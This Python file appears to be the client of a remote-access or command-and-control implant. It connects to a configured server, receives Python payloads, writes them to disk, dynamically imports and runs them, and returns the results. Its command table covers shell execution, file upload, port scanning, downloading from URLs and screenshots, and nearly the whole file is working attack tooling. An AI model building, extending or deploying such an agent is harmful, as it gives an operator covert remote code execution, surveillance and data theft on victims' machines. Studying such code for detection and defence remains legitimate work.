import socket
import json
import os
import threading
from queue import Queue
import time
from config_client_file import BaseConfig
from termcolor import colored


class Client():
    def __init__(self):
        self.server_host = BaseConfig.SERVER_IP
        self.server_port = int(BaseConfig.SERVER_PORT)
        self.keep_alive_interval = int(BaseConfig.KEEP_ALIVE_INTERVAL)
        self.keep_alive = threading.Event()
        self.last_keep_alive = time.time()
        self.running = True
        # Set up queue to manage incoming commands
        self.command_queue = Queue()
        self.payload_dir = BaseConfig.PAYLOAD_DIR
        
        


        self.command_methods = {
            "file_upload": "execute_file_upload",
            "shell_exec": "execute_shell_command",
            "port_scan": "execute_port_scan",
            "dowmload_from_url": "execute_dowmload_from_url",
            "screenshot":"excute_screenshot"}
        
        
    
    # Set up connection to server
    def connect(self):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((self.server_host, self.server_port))
        # print("connected")
        # threading.Thread(target=self.send_keep_alive).start()
        self.listen_for_messages()
    
        


    # Handle incoming commands
    def handle_command(self ,command_payload ,command_type ,command_id ,command_args):
       
        # determine the filename and path for the payload file
        filename = f"{command_id}_{command_type}.py"
        command_file_path = os.path.join(self.payload_dir, filename)

        # save the payload data to the file
        with open(command_file_path, "w") as f:
            f.write(command_payload)

        # Load the command payload as a Python module
        module = __import__(filename[:-3])

        # Get the name of the method to execute based on the command type
        method_name = self.command_methods[command_type]

        # Get the method to execute from the loaded module
        method = getattr(module, method_name)

        # Execute the method with the command payload and arguments
        if not command_args:
            result = method()
        else:
           result = method(command_args)
        
        # Transmit command execution results to server
       
        status = 'Error' if result.startswith("Error") else 'Finished'
        try:
            if result: 
                result_message = {'type': 'result', 'command_id': command_id,'command_type': command_type , 'command_result': result,'command_status':status }
        except Exception as e:
            return (colored(f"The command could not be executed: {e}","red"))

        # Delete command file
        os.remove(command_file_path)
        return result_message
            


    # Handle incoming messages from server
    def handle_message(self ,message):
        self.command_queue.put(message)
        t1 =threading.Thread(target=self.process_commands, args=(self.command_queue.get(),))
        t1.start()
        t1.join()
    
    # Listening for incoming messages from server
    def listen_for_messages(self):
        while self.running:
            message = self._recv(self.client_socket)
            if message:
                if message["command_type"] == "exit":
                    self._send(self.client_socket, message)
                    break
                else:
                 self.handle_message(message)
        self.client_socket.close()

    # Sending keep alive messages to the server
    def send_keep_alive(self):
        while True:
            try:
                keep_alive_message = {'command_type': 'keep_alive' }
                self._send(self.client_socket , keep_alive_message)
                time.sleep(self.keep_alive_interval)
            except ConnectionResetError:
                return(colored("Connection reset by server. Reconnecting..."),"red")
                
    # Process incoming commands
    def process_commands(self , message):
        send_msg = False
        while send_msg is False:
            command = message
            command_payload = command["command_payload_path"]
            command_type = command["command_type"]
            command_id = command["command_id"]
            command_args = command["command_args"]
            result_message = self.handle_command(command_payload, command_type, command_id, command_args)
            self.command_queue.task_done()  # Mark command as done in queue
            try:
                if result_message:
                    send_msg = True
                    self._send(self.client_socket,result_message)
            except Exception as e:
                return(colored(f"Thw command was nor excuted: {e}","red"))
        
    #Send data to the server    
    def _send(self, socket, data):
        try:
            serialized = json.dumps(data)
        except (TypeError, ValueError):
            raise Exception('You can only send JSON-serializable data')
        socket.sendall(serialized.encode('utf-8'))

    #Recive data from the server
    def _recv(self ,socket):
        data = b""
        while True:
            chunk = socket.recv(1024)
            if not chunk or b"}" in chunk:
                data += chunk
                break
            data += chunk
        try:
            print("out")
            deserialized = json.loads(data.decode("utf-8"))
        except (TypeError, ValueError , json.decoder.JSONDecodeError) as e:
                raise Exception('Data received was not in JSON format' + str(e))
        return deserialized


                



    


client = Client()
client.connect()



